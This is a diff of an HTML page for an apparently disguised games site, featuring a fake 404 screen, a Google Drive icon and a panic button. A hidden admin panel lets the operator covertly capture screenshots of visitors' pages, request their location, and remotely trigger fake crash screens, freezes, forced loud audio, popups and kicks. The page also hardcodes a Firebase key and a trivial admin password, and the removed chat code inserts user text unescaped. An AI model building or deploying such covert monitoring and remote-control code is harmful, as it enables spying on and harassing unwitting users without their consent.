@@ -6,206 +6,170 @@
     <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
+        /* Variables (Dynamic) */
         :root { --primary: #00ff41; --bg: #000; --card: #111; --err: #ff0000; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; transition: 0.3s; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; transition: background 0.5s; }
         
-        #ghostAdmin { position: fixed; top: 0; left: 0; width: 30px; height: 30px; z-index: 9999999; cursor: crosshair; }
-        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999999; display: none; flex-direction:column; align-items: center; justify-content: center; color: var(--primary); font-size: 2rem; text-align: center; }
+        /* Hidden Admin Trigger */
+        #ghostAdmin { position: fixed; top: 0; left: 0; width: 40px; height: 40px; z-index: 999999; cursor: crosshair; }
 
-        /* Site UI */
+        /* Fake 404 & Freeze */
+        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999999; display: none; flex-direction:column; align-items: center; justify-content: center; color: var(--primary); font-family: monospace; }
+        
+        /* Main Site */
         #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
         .nav { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: rgba(255,255,255,0.05); border-bottom: 1px solid #333; }
         .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
-        .card { background: var(--card); border: 1px solid #333; padding: 30px; text-align: center; cursor: pointer; border-radius: 8px; position: relative; }
-        .card.locked { opacity: 0.3; cursor: not-allowed; }
-        .card.locked::after { content: "🔒 LOCKED"; position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-weight: bold; color: var(--err); }
+        .card { background: var(--card); border: 1px solid #333; padding: 30px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); transition: 0.2s; }
+        .card:hover { border-color: var(--primary); background: #1a1a1a; transform: translateY(-3px); }
 
-        /* Global Chat */
-        #chat-box { position: fixed; bottom: 20px; right: 20px; width: 300px; height: 400px; background: #0a0a0a; border: 1px solid #333; display: flex; flex-direction: column; z-index: 500000; border-radius: 10px; overflow: hidden; box-shadow: 0 0 20px #000; }
-        #chat-msgs { flex-grow: 1; overflow-y: auto; padding: 10px; font-size: 13px; color: #ccc; }
-        .msg-line { margin-bottom: 5px; }
-        .msg-name { font-weight: bold; color: var(--primary); }
-        #chat-in { background: #000; border: none; border-top: 1px solid #333; padding: 10px; color: #fff; outline: none; }
-
-        /* Admin Dashboard v9 */
-        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #080808; border: 2px solid #444; width: 98%; max-width: 1400px; height: 90vh; z-index: 3000000; border-radius: 12px; color: #fff; flex-direction: column; }
-        .m-tabs { display: flex; background: #111; }
-        .m-tab { flex: 1; padding: 15px; text-align: center; cursor: pointer; color: #666; border-bottom: 2px solid transparent; transition: 0.2s; font-weight: bold; }
+        /* V8 Admin Panel */
+        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #080808; border: 2px solid #444; width: 95%; max-width: 1300px; height: 90vh; z-index: 3000000; border-radius: 12px; box-shadow: 0 0 100px #000; color: #fff; flex-direction: column; }
+        .m-tabs { display: flex; background: #111; border-bottom: 1px solid #333; }
+        .m-tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; color: #666; font-weight: bold; }
         .m-tab.active { color: var(--primary); background: #000; border-bottom: 2px solid var(--primary); }
-        .m-body { display: none; flex-grow: 1; padding: 20px; overflow: hidden; gap: 20px; }
-        .m-body.active { display: flex; }
+        .m-content { flex-grow: 1; display: none; padding: 20px; gap: 20px; overflow: hidden; }
+        .m-content.active { display: flex; }
 
-        .u-sidebar { width: 320px; background: #050505; border: 1px solid #333; overflow-y: auto; }
-        .u-card { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; }
-        .u-card.selected { background: #111; border-left: 5px solid var(--primary); }
-        .u-card small { color: #888; font-size: 10px; }
+        /* Sidebar & Target Info */
+        .col-u { width: 300px; background: #050505; border: 1px solid #333; overflow-y: auto; }
+        .u-item { padding: 12px; border-bottom: 1px solid #222; cursor: pointer; }
+        .u-item.selected { background: #111; border-left: 5px solid var(--primary); color: var(--primary); }
+        .col-v { flex-grow: 1; display: flex; flex-direction: column; gap: 15px; }
 
-        #mon-window { flex-grow: 1; background: #000; border: 1px solid #333; position: relative; overflow: hidden; }
-        #mon-feed { max-width: 100%; max-height: 100%; object-fit: contain; }
+        /* The Monitor */
+        #monitor { height: 400px; background: #000; border: 1px solid #333; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        #mon-view { max-width: 100%; max-height: 100%; }
 
-        .control-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; padding: 10px 0; }
-        .btn { background: #1a1a1a; color: var(--primary); border: 1px solid #333; padding: 10px; cursor: pointer; font-size: 11px; font-weight: bold; border-radius: 4px; }
+        .btn-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 10px; }
+        .btn { background: #222; color: var(--primary); border: 1px solid #444; padding: 12px; cursor: pointer; font-size: 11px; font-weight: bold; }
         .btn:hover { background: var(--primary); color: #000; }
         .btn-red { border-color: var(--err); color: var(--err); }
         .btn-red:hover { background: var(--err); color: #fff; }
 
-        /* Animations */
-        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-3px, -2px); } 100% { transform: translate(1px, -1px); } }
-        .shake-active { animation: shake 0.1s infinite; }
+        /* Clock in Admin */
+        #adminClock { position: absolute; right: 20px; top: 12px; color: #666; font-family: monospace; }
     </style>
 </head>
 <body>
 
     <div id="ghostAdmin" onclick="openAdmin()"></div>
-    <div id="lockdown"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
-    <div id="freeze"><h1>🚫 UNAUTHORIZED ACCESS 🚫</h1><p>Your connection has been logged.</p></div>
+    <div id="lockdown"><h1>404</h1><p>File Not Found</p></div>
+    <div id="freeze"><h1>SYSTEM LOCKED</h1><p>Contact Administrator</p></div>
 
-    <div id="loginOverlay" style="position:fixed; inset:0; background:#000; z-index:1500000; display:none; align-items:center; justify-content:center;">
-        <div style="background:#111; padding:40px; border:1px solid #333; border-radius:10px; text-align:center; width:300px;">
-            <h2 id="loginTitle" style="color:var(--primary);">MONGLE GATEWAY</h2>
-            <input type="text" id="username" style="width:100%; padding:10px; background:#000; border:1px solid #333; color:#fff;" placeholder="Enter Name...">
-            <button class="btn" style="width:100%; margin-top:15px;" onclick="initSession()">START SESSION</button>
+    <div id="loginOverlay" style="position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1500000; display:none; align-items:center; justify-content:center;">
+        <div style="background:#111; padding:40px; border:1px solid #333; text-align:center;">
+            <h2 id="loginTitle" style="color:var(--primary);">IDENTITY REQUIRED</h2>
+            <input type="text" id="username" style="padding:10px; background:#000; border:1px solid #444; color:#fff; width:200px;" placeholder="Name...">
+            <button class="btn" style="display:block; width:100%; margin-top:10px;" onclick="initSession()">ENTER</button>
         </div>
     </div>
 
     <div id="app">
         <div class="nav">
-            <div id="siteNameDisplay" style="font-size:1.5rem; font-weight:bold;">MONGLE_OS</div>
+            <div id="siteBrand" style="font-size:24px; font-weight:bold;">MONGLE_OS</div>
             <div style="display:flex; gap:10px;">
-                <button id="adminBtn" class="btn" style="display:none;" onclick="toggleAdmin()">DASHBOARD</button>
-                <button class="btn btn-red" onclick="window.location.replace('https://google.com')">EXIT</button>
+                <button id="adminBtn" class="btn" style="display:none;" onclick="toggleModal()">ADMIN PANEL</button>
+                <button class="btn btn-red" onclick="window.location.replace('https://google.com')">PANIC</button>
             </div>
         </div>
         <div id="grid" class="game-grid"></div>
-        
-        <div id="chat-box">
-            <div id="chat-msgs"></div>
-            <input type="text" id="chat-in" placeholder="Global Chat..." onkeypress="if(event.key==='Enter') sendChat()">
-        </div>
     </div>
 
     <div id="adminM" class="modal">
         <div class="m-tabs">
-            <div class="m-tab active" onclick="tab(0)">👁️ WATCH</div>
-            <div class="m-tab" onclick="tab(1)">💣 PRANKS</div>
-            <div class="m-tab" onclick="tab(2)">⚙️ SETTINGS</div>
-            <div class="m-tab" onclick="tab(3)">📝 LOGS</div>
-            <button class="btn btn-red" style="padding:15px;" onclick="toggleAdmin()">CLOSE</button>
+            <div class="m-tab active" onclick="setTab(0)">👥 USER WATCH</div>
+            <div class="m-tab" onclick="setTab(1)">⚙️ SYSTEM CONTROL</div>
+            <div id="adminClock">00:00:00</div>
         </div>
 
-        <div id="tab0" class="m-body active">
-            <div id="userList" class="u-sidebar"></div>
-            <div style="flex-grow:1; display:flex; flex-direction:column;">
-                <div id="mon-window">
-                    <img id="mon-feed" src="">
-                    <div id="mon-data" style="position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); padding:10px; font-size:12px;">No Target Selected</div>
+        <div id="t0" class="m-content active">
+            <div id="userList" class="col-u"></div>
+            <div class="col-v">
+                <div id="monitor">
+                    <img id="mon-view" src="">
+                    <div id="mon-stats" style="position:absolute; bottom:10px; left:10px; background:rgba(0,0,0,0.8); padding:5px; font-size:12px;">No Target...</div>
                 </div>
-                <div class="control-grid">
-                    <button class="btn" onclick="act('capReq')">📸 SNAPSHOT</button>
-                    <button class="btn" onclick="act('recReq')">🎥 RECORD 5S</button>
+                <div class="btn-grid">
+                    <button class="btn" onclick="act('capReq')">📸 SNAP</button>
+                    <button class="btn" onclick="act('recReq')">🎥 REC 5s</button>
                     <button class="btn" onclick="act('gpsReq')">📍 GEOLOCATE</button>
-                    <button class="btn btn-red" onclick="act('kicked')">🚫 KICK</button>
-                    <button class="btn btn-red" onclick="act('bsod')">☠️ CRASH</button>
-                    <button class="btn btn-red" onclick="act('freeze')">❄️ FREEZE</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="tab1" class="m-body">
-            <div style="width:100%;">
-                <h3>Targeted Audio/Visual Manipulation</h3>
-                <div class="control-grid">
                     <button class="btn btn-red" onclick="act('skeleton')">💀 SKELETON BOMB</button>
-                    <button class="btn" onclick="act('shake')">📳 SHAKE SCREEN</button>
-                    <button class="btn" onclick="act('invert')">🌗 INVERT COLORS</button>
-                    <button class="btn" onclick="custom('speak')">🗣️ TEXT-TO-SPEECH</button>
-                    <button class="btn" onclick="custom('msg')">💬 ALERT POPUP</button>
-                    <button class="btn" onclick="custom('bg')">🖼️ SET BG IMAGE</button>
+                    <button class="btn btn-red" onclick="act('freeze')">❄️ FREEZE</button>
+                    <button class="btn btn-red" onclick="act('kicked')">🚫 KICK</button>
                 </div>
-                <div class="control-grid">
-                    <button class="btn" onclick="act('dizzy')">🌀 DIZZY MODE</button>
-                    <button class="btn" onclick="act('earrape')">🔊 MAX VOLUME</button>
+                <div class="btn-grid">
+                    <button class="btn" onclick="custom('msg')">💬 POPUP</button>
+                    <button class="btn" onclick="custom('speak')">🗣️ TTS</button>
+                    <button class="btn" onclick="custom('bg')">🖼️ WALLPAPER</button>
+                    <button class="btn" onclick="act('invert')">🌗 INVERT</button>
+                    <button class="btn" onclick="act('shake')">📳 SHAKE</button>
+                    <button class="btn btn-red" onclick="act('bsod')">☠️ CRASH</button>
                 </div>
             </div>
         </div>
 
-        <div id="tab2" class="m-body">
-            <div style="width:100%; max-width:600px;">
-                <h3>Global Controls</h3>
-                <label>Change Site Name:</label><br>
-                <input id="set-name" class="btn" style="width:100%; text-align:left; background:#000;"><br><br>
-                <label>Primary Theme Color:</label><br>
-                <input type="color" id="set-color" style="width:100%; height:40px;"><br><br>
-                <button class="btn" style="width:100%" onclick="saveGlobals()">APPLY TO ALL USERS</button>
-                <hr style="border:1px solid #222; margin:20px 0;">
-                <h3>Game Management</h3>
-                <label>Blacklist Game (Exact Name):</label><br>
-                <input id="set-lock" class="btn" style="width:100%; text-align:left; background:#000;" placeholder="e.g. FNAF.html">
-                <button class="btn btn-red" style="width:100%; margin-top:5px;" onclick="lockGame()">LOCK GAME</button>
+        <div id="t1" class="m-content">
+            <div style="width:100%; max-width:600px; margin:0 auto;">
+                <h3>Global Customization</h3>
+                <label>Site Name:</label><br>
+                <input type="text" id="inpName" style="width:100%; padding:10px; background:#111; border:1px solid #444; color:#fff;"><br><br>
+                <label>Theme Color:</label><br>
+                <input type="color" id="inpColor" style="width:100%; height:50px; background:none; border:none; cursor:pointer;"><br><br>
+                <button class="btn" style="width:100%" onclick="saveGlobal()">APPLY CHANGES TO ALL USERS</button>
+                <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
+                <button class="btn btn-red" style="width:100%" onclick="clearDB()">WIPE ALL USER DATA</button>
             </div>
         </div>
-
-        <div id="tab3" class="m-body">
-            <div id="system-logs" style="width:100%; background:#000; overflow-y:auto; font-family:monospace; padding:10px; color:#00ff41;">
-                [SYSTEM]: Overseer Log Started...
-            </div>
-        </div>
+        <div style="padding:10px; text-align:right;"><button class="btn btn-red" onclick="toggleModal()">CLOSE PANEL</button></div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        // --- 🔐 SETTINGS ---
-        const ADMIN_PASS = "MONGLE_ADMIN";
-        const FIRE_CFG = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
-        // ------------------
-
-        const app = initializeApp(FIRE_CFG);
+        // --- 🔐 CONFIG ---
+        const ADMIN_PASS = "balls"; // CHANGE THIS EASILY
+        const CFG = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
+        
+        const app = initializeApp(CFG);
         const db = getDatabase(app);
-        let userRef, myID, selectedID, isAdmin = false, gameData = [], lockedGames = [];
+        let userRef, myID, selectedID, isAdmin = false, gameData = [];
 
-        // Global Sync (Name, Color, Locked Games)
+        // Global Sync
         onValue(ref(db, 'globals'), s => {
             const g = s.val(); if(!g) return;
-            document.getElementById('siteNameDisplay').innerText = g.name;
+            document.getElementById('siteBrand').innerText = g.name;
             document.title = g.name;
             document.documentElement.style.setProperty('--primary', g.color);
-            lockedGames = g.locked || [];
-            renderGrid();
         });
 
-        // Chat Sync
-        onValue(ref(db, 'chat'), s => {
-            const box = document.getElementById('chat-msgs'); box.innerHTML = "";
-            s.forEach(m => {
-                const d = m.val();
-                box.innerHTML += `<div class="msg-line"><span class="msg-name">${d.user}:</span> ${d.text}</div>`;
-            });
-            box.scrollTop = box.scrollHeight;
-        });
-
-        window.openAdmin = () => { if(prompt("ACCESS:")===ADMIN_PASS){ isAdmin=true; document.getElementById('adminBtn').style.display='block'; initSession(); toggleAdmin(); }};
+        window.openAdmin = () => { if(prompt("ACCESS CODE:")===ADMIN_PASS){ isAdmin=true; document.getElementById('adminBtn').style.display='block'; initSession(); toggleModal(); } };
         
         window.initSession = async () => {
             const n = document.getElementById('username').value || "Guest";
-            document.getElementById('lockdown').style.display="none"; document.getElementById('loginOverlay').style.display="none"; document.getElementById('app').style.display="flex";
+            document.getElementById('lockdown').style.display="none"; 
+            document.getElementById('loginOverlay').style.display="none"; 
+            document.getElementById('app').style.display="flex";
 
-            userRef = push(ref(db, 'presence'), { name: n, activity: 'Browsing', res: `${screen.width}x${screen.height}`, joined: Date.now() });
+            userRef = push(ref(db, 'presence'), { name: n, activity: 'Browsing Menu', res: `${screen.width}x${screen.height}`, joined: Date.now() });
             myID = userRef.key;
-            onDisconnect(userRef).remove();
+            onDisconnect(userRef).remove(); // REMOVES FROM ADMIN LIST ON TAB CLOSE
 
             onValue(ref(db, `presence/${myID}`), s => {
                 const d = s.val(); if(!d) return;
                 if(d.kicked) window.location.href="https://google.com";
-                if(d.bsod) document.body.innerHTML="<div style='background:blue;height:100vh;color:white;padding:100px;font-family:sans-serif;'><h1>:(</h1>Your PC ran into a problem.</div>";
+                if(d.bsod) document.body.innerHTML="<div style='background:blue;height:100vh;color:white;padding:100px;'>:( PC_RAN_INTO_PROBLEM</div>";
                 document.getElementById('freeze').style.display = d.freeze ? 'flex' : 'none';
                 if(d.msg) { alert(d.msg); update(userRef,{msg:null}); }
                 if(d.speak) { const u=new SpeechSynthesisUtterance(d.speak); window.speechSynthesis.speak(u); update(userRef,{speak:null}); }
                 if(d.invert) document.body.style.filter = document.body.style.filter==='invert(1)'?'none':'invert(1)';
-                if(d.shake) document.body.classList.toggle('shake-active');
-                if(d.skeleton) { const a=new Audio('https://www.myinstants.com/media/sounds/spooky-scary-skeletons-remix.mp3'); a.volume=1; a.play(); update(userRef,{skeleton:false}); }
+                if(d.bg) { document.getElementById('app').style.backgroundImage = `url(${d.bg})`; update(userRef,{bg:null}); }
+                if(d.skeleton) { 
+                    const a = new Audio('https://www.myinstants.com/media/sounds/spooky-scary-skeletons-remix.mp3'); 
+                    a.volume = 1; a.play(); update(userRef,{skeleton:false});
+                }
                 if(d.capReq) html2canvas(document.body).then(c=>update(userRef,{lastCap:c.toDataURL("image/webp",0.2),capReq:false}));
             });
 
@@ -218,11 +182,9 @@
         window.renderGrid = () => {
             const g = document.getElementById('grid'); g.innerHTML="";
             gameData.forEach(game => {
-                const isLocked = lockedGames.includes(game.name);
-                const c = document.createElement('div'); c.className=`card ${isLocked?'locked':''}`;
+                const c = document.createElement('div'); c.className="card";
                 c.innerHTML=`<b>${game.name.replace('.html','')}</b>`;
                 c.onclick = () => {
-                    if(isLocked) return alert("Administrator has locked this game.");
                     update(userRef, { activity: `Playing: ${game.name}` });
                     window.open(`https://raw.githack.com/bob154526-hue/Mongle/main/${game.name}`, '_blank');
                 };
@@ -230,42 +192,37 @@
             });
         };
 
-        window.sendChat = () => {
-            const i = document.getElementById('chat-in'); if(!i.value) return;
-            push(ref(db, 'chat'), { user: document.getElementById('username').value || "Admin", text: i.value });
-            i.value = "";
-        };
-
-        // Admin Logic
+        /* ADMIN CONTROL */
         function startOverseer() {
             onValue(ref(db, 'presence'), s => {
                 const l = document.getElementById('userList'); l.innerHTML="";
                 s.forEach(c => {
                     const u = c.val();
-                    const d = document.createElement('div'); d.className = `u-card ${selectedID===c.key?'selected':''}`;
+                    const d = document.createElement('div'); d.className = `u-item ${selectedID===c.key?'selected':''}`;
                     d.innerHTML = `<b>${u.name}</b><br><small>${u.activity}</small>`;
                     d.onclick = () => { selectedID = c.key; updateMon(u); };
                     l.appendChild(d);
                     if(selectedID===c.key) updateMon(u);
                 });
             });
+            setInterval(() => { document.getElementById('adminClock').innerText = new Date().toLocaleTimeString(); }, 1000);
         }
 
         function updateMon(u) {
-            document.getElementById('mon-feed').src = u.lastCap || "";
-            document.getElementById('mon-data').innerText = `NAME: ${u.name} | ACTIVITY: ${u.activity} | RESOLUTION: ${u.res}`;
+            document.getElementById('mon-view').src = u.lastCap || "";
+            document.getElementById('mon-stats').innerHTML = `TARGET: ${u.name} | ACT: ${u.activity} | RES: ${u.res}`;
         }
 
-        window.tab = (n) => {
+        window.setTab = (n) => {
             document.querySelectorAll('.m-tab').forEach((t,i)=>t.className=i===n?'m-tab active':'m-tab');
-            document.querySelectorAll('.m-body').forEach((b,i)=>b.className=i===n?'m-body active':'m-body');
+            document.querySelectorAll('.m-content').forEach((c,i)=>c.className=i===n?'m-content active':'m-content');
         };
 
-        window.act = (k) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[k]: true}); };
-        window.custom = (k) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[k]: prompt("Value:")}); };
-        window.toggleAdmin = () => { const m=document.getElementById('adminM'); m.style.display=m.style.display==='flex'?'none':'flex'; };
-        window.saveGlobals = () => { update(ref(db, 'globals'), { name: document.getElementById('set-name').value, color: document.getElementById('set-color').value }); };
-        window.lockGame = () => { const n=document.getElementById('set-lock').value; if(n) { lockedGames.push(n); update(ref(db, 'globals'), {locked: lockedGames}); }};
+        window.act = (k) => { if(selectedID) update(ref(db,`presence/${selectedID}`), {[k]: true}); };
+        window.custom = (k) => { if(selectedID) update(ref(db,`presence/${selectedID}`), {[k]: prompt("Value:")}); };
+        window.toggleModal = () => { const m=document.getElementById('adminM'); m.style.display=m.style.display==='flex'?'none':'flex'; };
+        window.saveGlobal = () => { update(ref(db, 'globals'), { name: document.getElementById('inpName').value, color: document.getElementById('inpColor').value }); };
+        window.clearDB = () => remove(ref(db, 'presence'));
     </script>
 </body>
 </html>
